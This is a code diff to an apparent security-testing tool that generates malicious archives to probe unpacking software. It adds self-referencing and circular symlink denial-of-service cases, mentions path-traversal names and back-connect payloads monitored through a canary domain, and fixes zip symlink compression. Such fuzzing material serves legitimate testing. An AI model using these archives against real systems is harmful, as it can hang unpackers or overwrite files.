@@ -58,7 +58,7 @@ PAYLOAD_DEFAULT_LINKNAME = "ZZZ"
 OUTPUT_FILE_PREFIX = ""
 
 
-CANARY_DOMAIN = "4in55p01plqupjgqeja8syv34ualycm1.pgd.li"  # Some payloads try a back-connect (e.g. UNC paths), monitor this domain!
+CANARY_DOMAIN = "yvxezbxauc610seci7mh0biyyp4gsbg0.CANARY.exmaple.org"  # Some payloads try a back-connect (e.g. UNC paths), monitor this domain!
 
 # You can either use ../../../TRVS (value of PAYLOAD_DEFAULT_NAME) when this is True.
 # When set to False it will try to use the same name as the archive's name, because this way you can simply try to unpack all files
@@ -343,8 +343,14 @@ class CustomZipArchive(CustomArchive):
         zipInfo = fipfile.ZipInfo(from_name)
         zipInfo.create_system = 3 # System which created ZIP archive, 3 = Unix; 0 = Windows
         unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
-        zipInfo.external_attr = unix_st_mode << 16 # The Python zipfile module accepts the 16-bit "Mode" field (that stores st_mode field from struct stat, containing user/group/other permissions, setuid/setgid and symlink info, etc) of the ASi extra block for Unix as bits 16-31 of the external_attr
-        self.archive_out_file.writestr(zipInfo, to_name)
+        zipInfo.external_attr = unix_st_mode << 16 # The Python zipfile module accepts the 16-bit "Mode" field (that stores st_mode field 
+        # from struct stat, containing user/group/other permissions, setuid/setgid and symlink info, etc) of the ASi extra block for Unix as bits 16-31 of the external_attr
+        
+        # ATTENTION: compress_type and compress_level are super important, because it's not enough to pass it to the ZipFile constructor
+        # From the Python doc of zipfile:
+        # Note: When passing a ZipInfo instance as the zinfo_or_arcname parameter, the compression method used will be that specified in the compress_type member 
+        # of the given ZipInfo instance. By default, the ZipInfo constructor sets this member to ZIP_STORED. 
+        self.archive_out_file.writestr(zipInfo, to_name, compress_type=self.compression, compresslevel=self.compress_level)
         self.info_out_file.write(f"- Added symlink pointing from {from_name} to {to_name}\n")
 
     def add_hardlink(self, from_name, to_name):
@@ -911,6 +917,27 @@ def main():
             except UnsupportedException as e:
                 Logger.info(e) if not 'ustar' in str(e) else ""
                 archive.close_and_remove()
+        
+        attack_name = "dos_self_symlink"
+        for archive in creator.create(attack_name):
+            try:
+                archive.add_cwd_content()
+                archive.add_symlink("K", "K")
+                archive.close()
+            except UnsupportedException as e:
+                Logger.info(e) if not 'ustar' in str(e) else ""
+                archive.close_and_remove()
+        
+        attack_name = "dos_circle_symlink"
+        for archive in creator.create(attack_name):
+            try:
+                archive.add_cwd_content()
+                archive.add_symlink("L", "M")
+                archive.add_symlink("M", "L")
+                archive.close()
+            except UnsupportedException as e:
+                Logger.info(e) if not 'ustar' in str(e) else ""
+                archive.close_and_remove()
 
         attack_name = "unpack_sw-description-symlink"
         for archive in creator.create(attack_name):
@@ -1147,13 +1174,14 @@ class DirectoryCleaner:
                 Logger.info("Found a list with " + str(len(files)) + " entries, will need to read that many files and calculate their hashes...")
             unique = set()
             for filepath in files:
-                with open(filepath, "rb") as openfile:
-                    # We are not interested in cryptographic strength, so let's use md5 here instead of sha256:
-                    filehash = hashlib.md5(openfile.read()).digest()
-                if filehash not in unique:
-                    unique.add(filehash)
-                else:
-                    yield filepath
+                if os.path.isfile(filepath):
+                    with open(filepath, "rb") as openfile:
+                        # We are not interested in cryptographic strength, so let's use md5 here instead of sha256:
+                        filehash = hashlib.md5(openfile.read()).digest()
+                    if filehash not in unique:
+                        unique.add(filehash)
+                    else:
+                        yield filepath
         if use_disc and os.path.isfile(DirectoryCleaner.filesizes_file):
             os.remove(DirectoryCleaner.filesizes_file)
     
